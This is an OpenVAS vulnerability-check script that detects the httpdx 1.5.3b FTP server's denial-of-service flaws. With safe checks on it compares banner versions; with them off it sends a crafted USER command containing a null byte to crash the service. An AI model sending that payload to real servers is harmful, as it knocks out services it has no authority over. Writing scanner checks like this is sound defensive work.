###############################################################################
# OpenVAS Vulnerability Test
#
# httpdx Multiple Remote Denial Of Service Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100534");
  script_version("2022-05-02T09:35:37+0000");
  script_tag(name:"last_modification", value:"2022-05-02 09:35:37 +0000 (Mon, 02 May 2022)");
  script_tag(name:"creation_date", value:"2010-03-15 19:33:39 +0100 (Mon, 15 Mar 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_name("httpdx Multiple Remote Denial Of Service Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38718");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_MIXED_ATTACK);
  script_family("FTP");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/httpdx/detected");

  script_tag(name:"summary", value:"httpdx is prone to multiple remote denial-of-service vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploits may allow an attacker to crash the affected
  application, resulting in a denial-of-service condition.");

  script_tag(name:"affected", value:"httpdx 1.5.3b is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");
include("version_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port: ftpPort);
if(!banner || "httpdx" >!< banner)
  exit(0);

if(safe_checks()) {
  version = eregmatch(pattern: "httpdx/([^ ]+)", string: banner);
  if(isnull(version[1]))exit(0);

  if(version_is_equal(version: version[1], test_version: "1.5.3b")) {
    security_message(port: ftpPort);
    exit(0);
  }
} else {

  soc = open_sock_tcp(ftpPort);
  if(!soc){
    exit(0);
  }

  ftp_recv_line(socket:soc);

  data = string("USER ",raw_string(0x00),"0\r\n");
  send(socket:soc, data: data);
  close(soc);

  soc1 = open_sock_tcp(ftpPort);

  if(!ftp_recv_line(socket:soc1)) {
    security_message(port: ftpPort);
    exit(0);
  }
}

exit(0);
